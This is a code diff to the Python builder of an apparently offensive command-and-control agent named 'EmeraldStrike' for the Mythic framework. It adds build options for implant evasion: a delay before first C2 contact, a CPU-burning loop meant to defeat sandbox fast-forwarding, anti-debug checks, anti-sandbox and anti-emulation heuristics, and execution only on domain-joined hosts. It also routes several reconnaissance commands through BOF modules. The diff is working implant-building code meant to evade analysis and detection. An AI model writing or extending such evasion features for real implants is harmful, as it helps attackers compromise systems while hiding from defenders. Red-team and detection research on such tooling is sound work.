@@ -272,6 +272,56 @@ class EmeraldStrike(PayloadType):
                 HideCondition(name="module_shift", operand=HideConditionOperand.NotEQ, value="True"),
             ],
         ),
+        # ── Guardrails ──
+        BuildParameter(
+            name="guardrail_pre_sleep",
+            group_name="Guardrails",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Pre-sleep: native delay before any C2 contact (requires pre_sleep_seconds > 0)",
+        ),
+        BuildParameter(
+            name="pre_sleep_seconds",
+            group_name="Guardrails",
+            parameter_type=BuildParameterType.String,
+            default_value="0",
+            description="Seconds to sleep before first C2 contact (0 = disabled). Used by guardrail_pre_sleep.",
+        ),
+        BuildParameter(
+            name="guardrail_computational_delay",
+            group_name="Guardrails",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Computational delay: Fibonacci QPC-timed loop (3s of real wall-clock CPU work, defeats sandbox fast-forward)",
+        ),
+        BuildParameter(
+            name="guardrail_anti_debug",
+            group_name="Guardrails",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Anti-debug: PEB BeingDebugged + NtQueryInformationProcess debug port/object checks",
+        ),
+        BuildParameter(
+            name="guardrail_domain_joined",
+            group_name="Guardrails",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Domain-joined: exit if the host is not joined to an Active Directory domain",
+        ),
+        BuildParameter(
+            name="guardrail_anti_sandbox",
+            group_name="Guardrails",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Anti-sandbox: uptime > 30min, screen >= 1024x768, username/computer blocklist, file heuristics",
+        ),
+        BuildParameter(
+            name="guardrail_anti_emulation",
+            group_name="Guardrails",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Anti-emulation: timing, 1M failed CloseHandle, env consistency, NUMA alloc, 100M CPU burn, 256MB large alloc",
+        ),
         BuildParameter(
             name="shift_bootstrap",
             group_name="Evasion",
@@ -354,6 +404,16 @@ class EmeraldStrike(PayloadType):
                 config_content = f.read()
 
             selected_cmds = {c.lower() for c in self.commands.get_commands()}
+            # Commands replaced by BOF redirects via inline_execute.
+            # Their C++ implementations are still on disk but must not be
+            # compiled in -- the Mythic-side .py files now load a .o BOF
+            # and redirect the task to inline_execute at tasking time.
+            _BOF_REPLACED = {
+                "arp", "clipboard", "dns", "domaininfo", "env",
+                "localgroup", "psgrep", "route", "services",
+                "uptime", "windowlist",
+            }
+            selected_cmds -= _BOF_REPLACED
             all_cmd_macros = re.findall(r'#define (INCLUDE_CMD_\w+)', config_content)
             cmd_defines = []
             for macro in all_cmd_macros:
@@ -607,6 +667,13 @@ class EmeraldStrike(PayloadType):
         buf += struct.pack(">I", jitter)
 
         buf += struct.pack(">I", 0)  # killdate
+
+        # Pre-sleep seconds (guardrails delay before first C2 contact)
+        try:
+            pre_sleep = int(self.get_parameter("pre_sleep_seconds"))
+        except Exception:
+            pre_sleep = 0
+        buf += struct.pack(">I", pre_sleep)
 
         if c2_profile == "http":
             host = c2_params.get("callback_host", "")
@@ -876,6 +943,23 @@ class EmeraldStrike(PayloadType):
             self.get_parameter("shift_bootstrap")
         except Exception:
             pass
+
+        # ── Guardrails ──
+        guardrail_map = {
+            "guardrail_pre_sleep": "INCLUDE_GUARDRAIL_PRE_SLEEP",
+            "guardrail_computational_delay": "INCLUDE_GUARDRAIL_COMPUTATIONAL_DELAY",
+            "guardrail_anti_debug": "INCLUDE_GUARDRAIL_ANTI_DEBUG",
+            "guardrail_domain_joined": "INCLUDE_GUARDRAIL_DOMAIN_JOINED",
+            "guardrail_anti_sandbox": "INCLUDE_GUARDRAIL_ANTI_SANDBOX",
+            "guardrail_anti_emulation": "INCLUDE_GUARDRAIL_ANTI_EMULATION",
+        }
+        for param_name, macro in guardrail_map.items():
+            try:
+                val = self.get_parameter(param_name)
+            except Exception:
+                val = False
+            if val:
+                defines.append(f"#define {macro}")
 
         return "\n".join(defines)
 
